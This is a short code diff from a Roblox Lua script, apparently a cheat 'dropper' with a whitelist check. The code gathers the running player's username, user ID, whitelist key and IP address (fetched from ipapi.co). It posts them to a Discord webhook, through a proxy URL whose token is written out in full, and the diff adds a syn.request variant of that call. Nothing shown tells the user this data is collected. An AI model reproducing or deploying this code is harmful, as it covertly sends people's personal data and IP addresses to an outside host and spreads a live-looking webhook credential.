@@ -4,8 +4,10 @@ local config = _G.AgonyDropper
 
 local content = "Username: " .. game.Players.LocalPlayer.Name .. "\nUserID: " .. game.Players.LocalPlayer.UserId .. "\nWhitelist Key: " .. config.WhitelistKey .. "\nIP Address: " .. tostring(game:HttpGet("https://ipapi.co/json/"))
 
-game:HttpPost("https://boring-dubinsky-45de26.netlify.app/https/discord.com/api/webhooks/1043513353068359701/ZQ8m9nLH1eZ3vzZpVPQB00yhpXqunrbrtZZEm7wKwUKZFjUOgg3kbQCoyBZ00CJFSfS1", '{"content" = "' .. content .. '"}')
-
+if(getgenv()["syn"] ~= nil) then
+    syn.request("https://boring-dubinsky-45de26.netlify.app/https/discord.com/api/webhooks/1043513353068359701/ZQ8m9nLH1eZ3vzZpVPQB00yhpXqunrbrtZZEm7wKwUKZFjUOgg3kbQCoyBZ00CJFSfS1", "POST", nil, nil, '{"content" = "' .. content .. '"}')
+end
+    
 --[[for _,v in pairs(keys) do
     if(v == config.WhitelistKey) then
         whitelisted = true
